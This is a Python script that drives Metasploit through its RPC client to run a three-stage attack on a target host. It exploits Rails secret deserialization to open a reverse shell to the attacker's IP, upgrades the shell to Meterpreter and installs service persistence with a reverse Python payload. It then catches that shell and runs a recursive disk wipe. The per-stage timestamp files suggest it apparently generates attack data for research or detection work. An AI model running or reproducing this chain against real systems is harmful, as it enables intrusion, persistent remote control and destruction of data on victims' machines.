import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient

def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())

def main(argv):
    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    wipe_disk_folder = "/tmp"

    client = MsfRpcClient('kali')

    print("Starting first stage! ...")
    exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
    payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')

    exploit['RHOSTS'] = target_ip
    exploit['RPORT'] = 8181
    exploit['TARGETURI'] = '/'
    exploit['SECRET'] = 'a7aebc287bba0ee4e64f947415a94e5f'
    payload['LHOST'] = my_ip
    payload['LPORT'] = 4444

    output_time_file = 'time_stage_1_start.txt'
    record_timestamp(folder, output_time_file)

    result = exploit.execute(payload=payload)
    print(result)
    while client.jobs.list:
        print(client.jobs.list)
        time.sleep(1)
    

    exploit = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
    exploit['SESSION'] = 1
    result = exploit.execute()
    while client.jobs.list:
        print(client.jobs.list)
        time.sleep(1)
    
    output_time_file = 'time_stage_1_end.txt'
    record_timestamp(folder, output_time_file)

    # Second stage : 

    print("Starting second stage! ...")
    exploit = client.modules.use('exploit', 'linux/local/service_persistence')
    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
    exploit['SESSION'] = 2
    exploit['VERBOSE'] = True
    payload['LHOST'] = my_ip

    output_time_file = 'time_stage_2_start.txt'
    record_timestamp(folder, output_time_file)

    result = exploit.execute()
    while client.jobs.list:
        print(client.jobs.list)
        time.sleep(1)
    
    client.sessions.session('1').stop()
    client.sessions.session('2').stop()
    client.sessions.session('3').stop()

    output_time_file = 'time_stage_2_end.txt'
    record_timestamp(folder, output_time_file)

    # Third stage :

    print("Starting third stage! ...")
    exploit = client.modules.use('exploit', 'multi/handler')
    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
    payload['LHOST'] = my_ip

    output_time_file = 'time_stage_3_start.txt'
    record_timestamp(folder, output_time_file)

    result = exploit.execute()
    while client.jobs.list:
        print(client.jobs.list)
        time.sleep(1)
 
    shell = client.sessions.session('4')
    shell.write('apt install wipe -y')
    print("Waiting for wipe to install!! ...")
    time.sleep(30)
    shell.write("wipe -r -f {0}".format(wipe_disk_folder))

   

main(sys.argv)
    
    



    


     


